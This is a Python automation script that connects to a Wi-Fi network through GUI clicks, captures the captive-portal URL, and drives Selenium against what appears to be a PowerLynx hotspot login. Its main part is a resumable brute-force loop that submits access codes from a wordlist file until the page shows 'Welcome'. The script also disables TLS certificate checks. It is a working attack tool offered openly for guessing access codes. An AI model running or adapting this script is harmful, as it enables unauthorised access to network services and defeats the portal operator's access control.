import time
import sys
import os
import pyautogui
import pyperclip
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, StaleElementReferenceException

# UPDATE THESE COORDINATES IF YOUR SCREEN CHANGES
TRAY_X, TRAY_Y = 1207, 741
WIFI_ICON_X, WIFI_ICON_Y = 1091, 369
CONNECT_X, CONNECT_Y = 1102, 426

PROGRESS_FILE = "progress.txt"

print("Starting in 5 seconds. DO NOT TOUCH THE MOUSE!")
time.sleep(5)

# 1. OS TASKS
pyautogui.click(x=TRAY_X, y=TRAY_Y)
time.sleep(2)
pyautogui.click(x=WIFI_ICON_X, y=WIFI_ICON_Y)
time.sleep(10)
pyautogui.click(x=CONNECT_X, y=CONNECT_Y)
print("Waiting for browser to open...")
time.sleep(15)

# 2. COPY URL
pyautogui.hotkey('ctrl', 'l')
time.sleep(0.5)
pyautogui.hotkey('ctrl', 'c')
time.sleep(0.5)
PORTAL_URL = pyperclip.paste()
print("Captured URL: " + PORTAL_URL)

# 3. SELENIUM SETUP
options = webdriver.ChromeOptions()
options.add_argument('--ignore-certificate-errors')
options.add_argument('--ignore-ssl-errors')
driver = webdriver.Chrome(options=options)
driver.maximize_window()
time.sleep(2)

driver.set_page_load_timeout(30)
try:
    driver.get(PORTAL_URL)
except Exception as e:
    print("Failed to load page. Aborting.")
    driver.quit()
    sys.exit(1)

# 4. PAGE 1 REDIRECT AND USE BUTTON
print("Waiting for PowerLynx redirect...")
try:
    WebDriverWait(driver, 30).until(EC.url_contains("powerlynx.app"))
    time.sleep(5)
    
    # Force JS Click on the Use button inside the ExtJS span
    use_button = WebDriverWait(driver, 15).until(
        EC.presence_of_element_located((By.XPATH, "//span[text()='Use']/parent::button | //button[contains(text(), 'Use')]"))
    )
    driver.execute_script("arguments[0].click();", use_button)
    print("Clicked 'Use' on Page 1.")
    time.sleep(5)
except TimeoutException:
    print("FATAL ERROR: Page 1 failed to load or button not found.")
    driver.quit()
    sys.exit(1)

# 5. LOAD PASSWORDS AND RESUME PROGRESS
with open('my_passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f]

start_index = 0
if os.path.exists(PROGRESS_FILE):
    with open(PROGRESS_FILE, 'r') as f:
        try:
            start_index = int(f.read().strip())
            print("Resuming from attempt: " + str(start_index))
        except ValueError:
            pass

# 6. BRUTE FORCE LOOP
print("Starting brute force loop...")
for i in range(start_index, len(passwords)):
    pwd = passwords[i]
    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "code"))
        )
        code_input.clear()
        code_input.send_keys(pwd)
        
        submit_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        submit_btn.click()
        
        if i % 10 == 0:
            print("Attempt " + str(i) + ": " + pwd)
            with open(PROGRESS_FILE, 'w') as f:
                f.write(str(i))

        time.sleep(3)
        
        # Check for success
        if "Welcome" in driver.page_source:
            print("\nSUCCESS! The password is: " + pwd)
            if os.path.exists(PROGRESS_FILE):
                os.remove(PROGRESS_FILE)
            break
            
    except StaleElementReferenceException:
        time.sleep(2)
        pass
    except TimeoutException:
        print("Page timed out. Retrying...")
        time.sleep(2)
        pass
    except Exception as e:
        print("Error: " + str(e))
        time.sleep(2)

print("Script finished.")
driver.quit()